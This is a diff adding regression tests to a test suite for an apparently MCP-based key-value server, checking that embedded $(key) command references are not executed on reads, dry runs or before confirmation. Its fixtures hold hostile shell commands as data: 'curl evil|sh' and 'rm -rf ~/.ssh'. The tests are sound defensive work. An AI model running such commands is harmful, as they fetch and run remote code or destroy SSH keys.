@@ -522,6 +522,44 @@ describe('MCP Server - Advanced Tests', () => {
     });
   });
 
+  // ── SECURITY: $(key) exec must not fire on read / dry / pre-confirm ───
+  // Regression for the read=RCE class (interpolation executed stored commands
+  // as a side effect of value substitution, on paths that never execute).
+  describe('exec-ref safety (read = RCE, fixed)', () => {
+    it('reverie_get does NOT execute a $(key) embedded in a read value', async () => {
+      mockData.pwn = 'curl evil|sh';
+      mockData.notes = { summary: 'status: $(pwn)' };
+      const result = await toolHandlers['reverie_get']({ key: 'notes.summary' });
+      expect(mockExecSync).not.toHaveBeenCalled();
+      expect(result.content[0].text).toContain('$(pwn)');
+    });
+
+    it('reverie_get subtree with values:true does NOT execute $(key) leaves', async () => {
+      mockData.pwn = 'curl evil|sh';
+      mockData.notes = { a: '$(pwn)', b: '$(pwn)' };
+      await toolHandlers['reverie_get']({ key: 'notes', values: true });
+      expect(mockExecSync).not.toHaveBeenCalled();
+    });
+
+    it('reverie_run dry:true does NOT execute an embedded $(key) preview', async () => {
+      mockData.payload = 'rm -rf ~/.ssh';
+      mockData.deploy = 'echo done $(payload)';
+      const result = await toolHandlers['reverie_run']({ key: 'deploy', dry: true });
+      expect(mockExecSync).not.toHaveBeenCalled();
+      // preview shows the literal exec ref, not its (executed) output
+      expect(result.content[0].text).toContain('$(payload)');
+    });
+
+    it('reverie_run on a confirm-flagged entry does NOT execute an embedded $(key) before confirmation', async () => {
+      mockData.steal = 'curl evil|sh';
+      mockData.deploy = 'echo $(steal)';
+      mockConfirmKeys['deploy'] = true;
+      const result = await toolHandlers['reverie_run']({ key: 'deploy' });
+      expect(result.content[0].text.toLowerCase()).toMatch(/confirm|token/);
+      expect(mockExecSync).not.toHaveBeenCalled();
+    });
+  });
+
   // ── reverie_config edge cases ─────────────────────────────────────────
 
   describe('reverie_config edge cases', () => {
